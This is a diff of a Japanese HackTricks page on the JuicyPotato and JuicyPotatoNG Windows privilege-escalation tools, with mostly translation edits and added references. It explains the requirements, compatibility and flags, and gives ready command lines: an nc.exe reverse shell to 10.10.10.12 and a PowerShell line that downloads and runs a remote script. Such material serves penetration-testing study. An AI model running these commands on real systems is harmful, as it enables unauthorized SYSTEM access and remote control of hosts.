@@ -2,58 +2,57 @@
 
 {{#include ../../banners/hacktricks-training.md}}
 
-> [!WARNING] > JuicyPotatoはレガシーです。通常はWindows 10 1803 / Windows Server 2016までのバージョンで動作します。MicrosoftがWindows 10 1809 / Server 2019以降で導入した変更により元の手法は破壊されました。これら以降のビルドでは、PrintSpoofer、RoguePotato、SharpEfsPotato/EfsPotato、GodPotatoなどの現代的な代替手段を検討してください。最新のオプションと使用法については下のページを参照してください。
-
+> [!WARNING] > JuicyPotato はレガシーです。通常、Windows 10 1803 / Windows Server 2016 までの Windows バージョンで動作します。Windows 10 1809 / Server 2019 以降で提供された Microsoft の変更により、元の technique は動作しなくなりました。これらのビルド以降では、PrintSpoofer、RoguePotato、SharpEfsPotato/EfsPotato、GodPotato などの modern alternatives を検討してください。最新の options と usage については、以下のページを参照してください。
 
 {{#ref}}
 roguepotato-and-printspoofer.md
 {{#endref}}
 
-## Juicy Potato (ゴールデン特権の悪用) <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
+## Juicy Potato（golden privileges の abuse） <a href="#juicy-potato-abusing-the-golden-privileges" id="juicy-potato-abusing-the-golden-privileges"></a>
 
-_甘くしたバージョンの_ [_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG)_, 少しのjuiceを加えた、すなわち **another Local Privilege Escalation tool, from a Windows Service Accounts to NT AUTHORITY\SYSTEM**_
+_[_RottenPotatoNG_](https://github.com/breenmachine/RottenPotatoNG) の改良版で、少し juice を加えたもの、つまり **Windows Service Accounts から NT AUTHORITY\SYSTEM への、もう1つの Local Privilege Escalation tool**_ です。<sup>[[1]](#references)</sup>
 
-#### juicypotatoは[https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts)からダウンロードできます
+#### juicypotato は [https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts](https://ci.appveyor.com/project/ohpe/juicy-potato/build/artifacts) から download できます
 
-### 互換性 — 簡単な注意点
+### Compatibility の簡単な notes
 
-- 現在のコンテキストが SeImpersonatePrivilege または SeAssignPrimaryTokenPrivilege を持っている場合、Windows 10 1803 と Windows Server 2016 まで安定して動作します。
-- Windows 10 1809 / Windows Server 2019 以降での Microsoft のハードニングにより動作しません。これらのビルドでは上記の代替手段を推奨します。
+- 現在の context に SeImpersonatePrivilege または SeAssignPrimaryTokenPrivilege がある場合、Windows 10 1803 および Windows Server 2016 まで reliable に動作します。
+- Windows 10 1809 / Windows Server 2019 以降では、Microsoft の hardening により動作しません。これらの build では、上記でリンクした alternatives を優先してください。
 
 ### Summary <a href="#summary" id="summary"></a>
 
-[**From juicy-potato Readme**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**
+[**juicy-potato Readme より**](https://github.com/ohpe/juicy-potato/blob/master/README.md)**:**<sup>[[1]](#references)</sup>
 
-[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) and its [variants](https://github.com/decoder-it/lonelypotato) は、[`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) が `127.0.0.1:6666` で MiTM リスナーを持ち、かつ `SeImpersonate` または `SeAssignPrimaryToken` 権限がある場合に基づく権限昇格チェーンを利用します。Windows のビルドレビューの際に、`BITS` が意図的に無効化され、ポート `6666` が使用されている設定を見つけました。
+[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) とその [variants](https://github.com/decoder-it/lonelypotato) は、[`BITS`](<https://msdn.microsoft.com/en-us/library/windows/desktop/bb968799(v=vs.85).aspx>) [service](https://github.com/breenmachine/RottenPotatoNG/blob/4eefb0dd89decb9763f2bf52c7a067440a9ec1f0/RottenPotatoEXE/MSFRottenPotato/MSFRottenPotato.cpp#L126) が `127.0.0.1:6666` に MiTM listener を持ち、`SeImpersonate` または `SeAssignPrimaryToken` privileges がある場合に基づく privilege escalation chain を利用します。Windows build の review 中に、`BITS` が意図的に disabled で、port `6666` が使用されている環境を発見しました。
 
-そこで [RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) を武器化しました。**Juicy Potatoの登場です**。
+[RottenPotatoNG](https://github.com/breenmachine/RottenPotatoNG) を weaponize することにしました。**Juicy Potato の登場です。**
 
-> 理論については [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) を参照し、リンクと参照のチェーンを辿ってください。
+> theory については、[Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/) を参照し、links と references の chain をたどってください。<sup>[[4]](#references)</sup>
 
-我々は、`BITS` 以外にも悪用できるいくつかのCOMサーバーが存在することを発見しました。これらは次の条件を満たす必要があります:
+`BITS` 以外にも abuse できる COM servers がいくつか存在することを発見しました。必要な条件は次のとおりです。
 
-1. 現在のユーザーによってインスタンス化可能であること。通常はインパーソネーション権限を持つ“service user”（サービスユーザー）。
-2. `IMarshal` インターフェースを実装していること
-3. SYSTEM、Administrator などの昇格したユーザーとして実行されていること
+1. 現在の user（通常は impersonation privileges を持つ「service user」）が instantiable である
+2. `IMarshal` interface を implement している
+3. elevated user（SYSTEM、Administrator、…）として run する
 
-いくつかのテストの後、複数のWindowsバージョンで[interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) の広範なリストを取得してテストしました。
+いくつかの Windows versions で testing を行った結果、[interesting CLSID’s](http://ohpe.it/juicy-potato/CLSID/) の extensive list を取得し、test しました。
 
 ### Juicy details <a href="#juicy-details" id="juicy-details"></a>
 
-JuicyPotatoは次を可能にします:
+JuicyPotato では次のことが可能です。<sup>[[1]](#references)</sup>
 
-- **Target CLSID** _任意の CLSID を選択できます._ [_Here_](http://ohpe.it/juicy-potato/CLSID/) _で OS ごとに整理されたリストが見つかります。_
-- **COM Listening port** _好みの COM リスニングポートを定義できます（マシュアルされたハードコード 6666 の代わりに）_
-- **COM Listening IP address** _サーバーを任意の IP にバインドできます_
-- **Process creation mode** _インパーソネートされたユーザーの権限に応じて次から選択できます:_
-  - `CreateProcessWithToken` (needs `SeImpersonate`)
-  - `CreateProcessAsUser` (needs `SeAssignPrimaryToken`)
-  - `both`
-- **Process to launch** _エクスプロイトが成功した場合に実行ファイルやスクリプトを起動します_
-- **Process Argument** _起動するプロセスの引数をカスタマイズできます_
-- **RPC Server address** _ステルスなアプローチとして外部の RPC サーバーに対して認証することができます_
-- **RPC Server port** _外部サーバーに認証したいがファイアウォールでポート `135` がブロックされている場合に有用です…_
-- **TEST mode** _主にテスト目的、つまり CLSID のテスト用です。DCOM を作成しトークンのユーザーを出力します。テストについては_ [_here for testing_](http://ohpe.it/juicy-potato/Test/)_
+- **Target CLSID** _任意の CLSID を選択できます。_ [_こちら_](http://ohpe.it/juicy-potato/CLSID/) _に OS ごとに整理された list があります。_
+- **COM Listening port** _任意の COM listening port を定義できます（marshalled hardcoded 6666 の代わり）。_
+- **COM Listening IP address** _server を任意の IP に bind できます。_
+- **Process creation mode** _impersonated user の privileges に応じて、次から選択できます。_
+- `CreateProcessWithToken`（`SeImpersonate` が必要）
+- `CreateProcessAsUser`（`SeAssignPrimaryToken` が必要）
+- `both`
+- **Process to launch** _exploitation が成功した場合に executable または script を launch します。_
+- **Process Argument** _launch する process の arguments を customize します。_
+- **RPC Server address** _stealthy な approach として、external RPC server に authenticate できます。_
+- **RPC Server port** _external server に authenticate したい場合や、firewall が port `135` を block している場合に useful です。_
+- **TEST mode** _主に testing purposes、つまり CLSIDs の testing 用です。DCOM を create し、token の user を print します。testing については_ [_こちら_](http://ohpe.it/juicy-potato/Test/) _を参照してください。_
 
 ### Usage <a href="#usage" id="usage"></a>
 ```
@@ -74,28 +73,28 @@ Optional args:
 ```
 ### 最終的な考察 <a href="#final-thoughts" id="final-thoughts"></a>
 
-[**juicy-potato Readme から**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**
+[**juicy-potato Readmeより**](https://github.com/ohpe/juicy-potato/blob/master/README.md#final-thoughts)**:**<sup>[[1]](#references)</sup>
 
-ユーザに `SeImpersonate` または `SeAssignPrimaryToken` 権限があれば、あなたは **SYSTEM** です。
+ユーザーが `SeImpersonate` または `SeAssignPrimaryToken` の権限を持っている場合、あなたは **SYSTEM** です。
 
-これらすべての COM Servers の悪用を完全に防ぐことはほとんど不可能です。`DCOMCNFG` を使ってこれらのオブジェクトの権限を変更することを考えるかもしれませんが、うまくいくとは限らず非常に困難でしょう。
+これらすべての COM Servers の悪用を防ぐことは、ほぼ不可能です。`DCOMCNFG` を使用してこれらのオブジェクトの権限を変更することを考えられますが、幸運を祈ります。これは非常に困難です。
 
-実際の解決策は、`* SERVICE` アカウントで実行される機密アカウントやアプリケーションを保護することです。`DCOM` を停止すればこのエクスプロイトを抑制できる可能性はありますが、基盤となる OS に重大な影響を与える可能性があります。
+実際の解決策は、`* SERVICE` アカウントで実行される機密性の高いアカウントとアプリケーションを保護することです。`DCOM` を停止すれば、確実にこの exploit を阻止できますが、基盤となる OS に深刻な影響を与える可能性があります。
 
-From: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)
+出典: [http://ohpe.it/juicy-potato/](http://ohpe.it/juicy-potato/)<sup>[[3]](#references)</sup>
 
 ## JuicyPotatoNG (2022+)
 
-JuicyPotatoNG は、以下を組み合わせることで modern Windows 上に JuicyPotato スタイルの local privilege escalation を再導入します:
-- DCOM OXID resolution を選択したポート上のローカル RPC server に向けることで、古いハードコードされた 127.0.0.1:6666 リスナーを回避。
-- SSPI hook を使って、`RpcImpersonateClient` を必要とせずに着信する SYSTEM 認証をキャプチャして偽装。これにより、`SeAssignPrimaryTokenPrivilege` のみがある場合でも `CreateProcessAsUser` が可能になる。
-- DCOM アクティベーションの制約（例: PrintNotify / ActiveX Installer Service クラスを狙う際に以前必要だった INTERACTIVE-group 要件）を満たすためのトリック。
+JuicyPotatoNG は、以下を組み合わせることで、最新の Windows に JuicyPotato スタイルの local privilege escalation を再導入します。<sup>[[2]](#references)</sup>
+- DCOM OXID resolution により、選択したポート上の local RPC server を使用し、従来のハードコードされた 127.0.0.1:6666 listener を回避する。
+- SSPI hook により、RpcImpersonateClient を必要とせずに受信した SYSTEM authentication を capture および impersonate する。これにより、SeAssignPrimaryTokenPrivilege のみが存在する場合でも CreateProcessAsUser が使用可能になる。
+- DCOM activation の制約を満たすための tricks（例: PrintNotify / ActiveX Installer Service classes を target にする場合、以前必要だった INTERACTIVE-group requirement）。
 
-重要な注意（ビルドによって挙動が変化）:
-- September 2022: 初期の手法は、“INTERACTIVE trick” を使用してサポートされている Windows 10/11 および Server ターゲットで動作しました。
-- January 2023 update from the authors: Microsoft は後に INTERACTIVE trick をブロックしました。異なる CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) により再びエクスプロイトが可能になりますが、投稿によるとこれは Windows 11 / Server 2022 のみで有効です。
+重要な注意事項（build によって挙動は変化します）。<sup>[[2]](#references)</sup>
+- 2022年9月: 初期の technique は、「INTERACTIVE trick」を使用して、サポート対象の Windows 10/11 および Server targets で動作した。
+- 2023年1月、authors による update: Microsoft はその後、INTERACTIVE trick を block した。別の CLSID ({A9819296-E5B3-4E67-8226-5E72CE9E1FB7}) により exploitation が復活するが、authors の post によれば Windows 11 / Server 2022 でのみ利用可能。
 
-基本的な使用法（詳細はヘルプのフラグを参照）:
+Basic usage（その他の flags は help を参照）:
 ```
 JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
 # Useful helpers:
@@ -103,13 +102,13 @@ JuicyPotatoNG.exe -t * -p "C:\Windows\System32\cmd.exe" -a "/c whoami"
 #  -s  Scan for a COM port not filtered by Windows Defender Firewall
 #  -i  Interactive console (only with CreateProcessAsUser)
 ```
-classic JuicyPotato がパッチ済みの Windows 10 1809 / Server 2019 を対象とする場合、ページ上部にリンクされている代替（RoguePotato、PrintSpoofer、EfsPotato/GodPotato など）を優先してください。NG はビルドやサービスの状態によって状況依存になる場合があります。
+Windows 10 1809 / Server 2019 を対象とし、classic JuicyPotato に patch が適用されている場合は、上部にリンクされている代替手段（RoguePotato、PrintSpoofer、EfsPotato/GodPotato など）を優先してください。NG は、build や service の状態によっては状況依存となる場合があります。
 
-## 例
+## Examples
 
-注: 試す CLSIDs の一覧については [this page](https://ohpe.it/juicy-potato/CLSID/) を参照してください。
+注: 試行する CLSID の一覧については、[this page](https://ohpe.it/juicy-potato/CLSID/) を参照してください。
 
-### nc.exe のリバースシェルを取得する
+### nc.exe reverse shell を取得する
 ```
 c:\Users\Public>JuicyPotato -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c c:\users\public\desktop\nc.exe -e cmd.exe 10.10.10.12 443" -t *
 
@@ -122,33 +121,35 @@ Testing {4991d34b-80a1-4291-83b6-3328366b9097} 1337
 
 c:\Users\Public>
 ```
-### Powershell rev
+### Powershell リバースシェル
 ```
 .\jp.exe -l 1337 -c "{4991d34b-80a1-4291-83b6-3328366b9097}" -p c:\windows\system32\cmd.exe -a "/c powershell -ep bypass iex (New-Object Net.WebClient).DownloadString('http://10.10.14.3:8080/ipst.ps1')" -t *
 ```
-### 新しい CMD を起動する（RDP アクセスがある場合）
+### 新しい CMD を起動する（RDP access がある場合）
 
-![](<../../images/image (300).png>)
+![Powershell rev - 新しい CMD を起動する（RDP access がある場合）: 新しい CMD を起動する（RDP access がある場合）](<../../images/image (300).png>)
 
 ## CLSID の問題
 
-多くの場合、JuicyPotato が使用するデフォルトの CLSID は **動作しない** ことがあり、exploit が失敗します。通常、**動作する CLSID** を見つけるには複数回の試行が必要です。特定のオペレーティングシステム用に試す CLSID の一覧を入手するには、次のページを参照してください：
+JuicyPotato が使用するデフォルトの CLSID は**動作しない**ことが多く、exploit が失敗します。通常、**動作する CLSID**を見つけるには複数回試行する必要があります。特定の operating system で試す CLSID のリストを取得するには、次のページを確認してください。
 
 - [https://ohpe.it/juicy-potato/CLSID/](https://ohpe.it/juicy-potato/CLSID/)
 
 ### **CLSID の確認**
 
-まず、juicypotato.exe 以外のいくつかの実行可能ファイルが必要です。
+まず、juicypotato.exe 以外にいくつかの executable が必要です。
 
-Join-Object.ps1 をダウンロードして PS セッションに読み込み、GetCLSID.ps1 をダウンロードして実行します。そのスクリプトはテスト用の候補 CLSID の一覧を作成します。
+[Join-Object.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/utils/Join-Object.ps1) を download して PS session に load し、[GetCLSID.ps1](https://github.com/ohpe/juicy-potato/blob/master/CLSID/GetCLSID.ps1) を download して execute します。この script は、テスト可能な CLSID のリストを作成します。
 
-次に test_clsid.bat をダウンロードし（CLSID リストおよび juicypotato 実行ファイルへのパスを変更してください）、実行します。これが各 CLSID を順に試行し、**ポート番号が変わったときにその CLSID が動作したことを意味します**。
+次に、[test_clsid.bat ](https://github.com/ohpe/juicy-potato/blob/master/Test/test_clsid.bat) を download し（CLSID リストと juicypotato executable への path を変更します）、execute します。すべての CLSID の試行が開始され、**port number が変化した場合、その CLSID が動作したことを意味します**。
 
-**-c パラメータを使用して動作する CLSID を確認してください**
+動作する CLSID を parameter **-c** で**確認**します。
 
-## 参考
+## 参考資料
 
-- [https://github.com/ohpe/juicy-potato/blob/master/README.md](https://github.com/ohpe/juicy-potato/blob/master/README.md)
-- [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
+- [1] [Juicy Potato README (ohpe/juicy-potato)](https://github.com/ohpe/juicy-potato/blob/master/README.md)
+- [2] [Giving JuicyPotato a second chance: JuicyPotatoNG (decoder.it)](https://decoder.cloud/2022/09/21/giving-juicypotato-a-second-chance-juicypotatong/)
+- [3] [Juicy Potato project page (ohpe.it)](http://ohpe.it/juicy-potato/)
+- [4] [Rotten Potato - Privilege Escalation from Service Accounts to SYSTEM](https://foxglovesecurity.com/2016/09/26/rotten-potato-privilege-escalation-from-service-accounts-to-system/)
 
 {{#include ../../banners/hacktricks-training.md}}
